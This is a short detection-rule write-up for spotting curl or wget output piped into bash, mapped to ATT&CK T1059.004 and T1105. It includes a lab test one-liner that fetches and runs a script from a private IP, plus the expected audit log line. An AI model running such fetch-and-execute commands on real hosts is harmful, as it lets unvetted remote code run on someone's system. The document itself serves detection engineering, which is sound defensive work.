# Remote Script Execution via curl pipe bash (T1059.004 / T1105)

## What it detects
A process command line containing `curl` or `wget` piped (`|`) into `bash`.
This is the "download and run" pattern used by installers and attackers alike.

## Why it matters
It is the fastest way to execute arbitrary code on a host with no local
artifacts. Common in initial access (malicious "install" commands), in
post-exploitation (second-stage loaders), and in supply-chain compromises.
High signal when baselined.

## Test it (lab only)

On a lab host, against a URL YOU control:

```bash
curl -s http://192.168.1.10/hello.sh | bash
Expected process-creation event (auditd / Sysmon-for-Linux):

text
type=EXECVE ... a0="bash" a1="-c" a2="curl -s http://192.168.1.10/hello.sh | bash"
False positives
Legitimate install scripts fetched and piped in automation pipelines

Container entrypoints that fetch setup scripts

Developer one-liners in scratch environments

Tuning
If your environment legitimately pipes installers, exclude the specific
parent process or fetch domain rather than disabling the rule. Better:
alert on new domains being piped to bash.

ATT&CK
Technique: T1059.004 — Command and Scripting Interpreter: Unix Shell

Technique: T1105 — Ingress Tool Transfer

Tactic: Execution
